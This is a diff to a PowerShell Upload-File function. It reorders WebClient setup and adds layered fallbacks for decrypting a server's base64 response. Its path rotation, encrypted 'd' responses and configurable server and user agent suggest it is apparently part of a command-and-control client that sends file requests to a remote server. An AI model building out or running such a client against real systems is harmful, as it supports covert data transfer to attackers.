@@ -168,23 +168,6 @@ function Upload-File {
         $requestJson = ConvertTo-Json -InputObject $fileRequest -Compress
         Write-Host "Request JSON: $requestJson"
         
-        # Create a web client for file request - directly create it instead of using helper function
-        $webClient = New-Object System.Net.WebClient
-        
-        # Set User-Agent
-        $webClient.Headers.Add("User-Agent", $userAgent)
-        
-        # Set proxy if enabled
-        if ($proxyEnabled -and $global:proxyInstance) {
-            $webClient.Proxy = $global:proxyInstance
-        }
-        
-        # Add authentication credentials if configured
-        if ($useCredentials) {
-            $credentials = New-Object System.Net.NetworkCredential($username, $password)
-            $webClient.Credentials = $credentials
-        }
-        
         # Get current file request path
         $fileRequestPath = if ($global:pathRotationEnabled) { 
             Get-CurrentPath -PathType "file_request_path" 
@@ -211,31 +194,95 @@ function Upload-File {
         # Convert payload to JSON with proper handling
         $payloadJson = ConvertTo-Json -InputObject $payload -Compress -Depth 4
         
+        # Create a web client
+        $webClient = New-Object System.Net.WebClient
+        
+        # Set User-Agent
+        $webClient.Headers.Add("User-Agent", $userAgent)
+        
+        # Set proxy if enabled
+        if ($proxyEnabled -and $global:proxyInstance) {
+            $webClient.Proxy = $global:proxyInstance
+        }
+        
+        # Add authentication credentials if configured
+        if ($useCredentials) {
+            $credentials = New-Object System.Net.NetworkCredential($username, $password)
+            $webClient.Credentials = $credentials
+        }
+        
+        # Explicitly set content type
+        $webClient.Headers.Add("Content-Type", "application/json")
+        
         # Send the request
         $requestUrl = "http://$serverAddress$fileRequestPath"
         Write-Host "Sending file request to $requestUrl"
-        $response = $webClient.UploadString($requestUrl, $payloadJson)
         
-        # Parse the response with proper error handling
+        # ===== NEW ERROR HANDLING AND DEBUG CODE =====
         try {
-            # First validate we actually got JSON back
-            if (-not $response.StartsWith('{')) {
-                throw "Server response is not valid JSON: $response"
+            # Send the request
+            $response = $webClient.UploadString($requestUrl, $payloadJson)
+            
+            # Debug the response 
+            Write-Host "DEBUG: Response length: $($response.Length) chars"
+            Write-Host "DEBUG: Response preview: $($response.Substring(0, [Math]::Min(50, $response.Length)))"
+            
+            # ===== FALLBACK HANDLING CODE =====
+            # First try to parse as JSON with standard handling
+            try {
+                $responseObj = $null
+                
+                # Check if response is valid JSON by trying to parse it
+                $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
+                
+                # If we get here, JSON parsing succeeded
+                Write-Host "DEBUG: Response JSON has these properties: $($responseObj.PSObject.Properties.Name -join ', ')"
+                
+                # If 'd' field is missing, try to handle it
+                if (-not ($responseObj.PSObject.Properties.Name -contains 'd')) {
+                    Write-Host "WARNING: Response missing 'd' field, trying fallback"
+                    
+                    # FALLBACK 1: Check if the entire response itself is the encrypted data 
+                    try {
+                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
+                        Write-Host "SUCCESS: Decrypted response directly"
+                    }
+                    catch {
+                        # FALLBACK 2: Try wrapping response in a structure with a 'd' field
+                        try {
+                            $modifiedResponse = @{ d = $response }
+                            $modifiedJson = ConvertTo-Json -InputObject $modifiedResponse -Compress
+                            $responseObj = ConvertFrom-Json -InputObject $modifiedJson
+                            $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObj.d
+                            Write-Host "SUCCESS: Used wrapped response"
+                        }
+                        catch {
+                            # If all attempts failed, throw the original error
+                            throw "Response missing data field 'd' and fallbacks failed"
+                        }
+                    }
+                }
+                else {
+                    # Regular processing with d field present
+                    $encryptedData = $responseObj.d
+                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedData
+                }
+            }
+            catch [System.ArgumentException] {
+                # This happens if ConvertFrom-Json fails - the response isn't valid JSON
+                Write-Host "ERROR: Response is not valid JSON"
+                
+                # FALLBACK 3: Try to treat entire response as encrypted data
+                try {
+                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
+                    Write-Host "SUCCESS: Decrypted response directly (not JSON)"
+                }
+                catch {
+                    throw "Response is not valid JSON and could not be decrypted: $_"
+                }
             }
             
-            $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
-            
-            # Check if response has the expected structure
-            if (-not $responseObj.d) {
-                throw "Response missing data field 'd'"
-            }
-            
-            $encryptedData = $responseObj.d
-            
-            # Decrypt the response
-            $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedData
-            
-            # Validate the decrypted response is proper JSON
+            # Try to parse the decrypted response as JSON
             try {
                 $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
             }
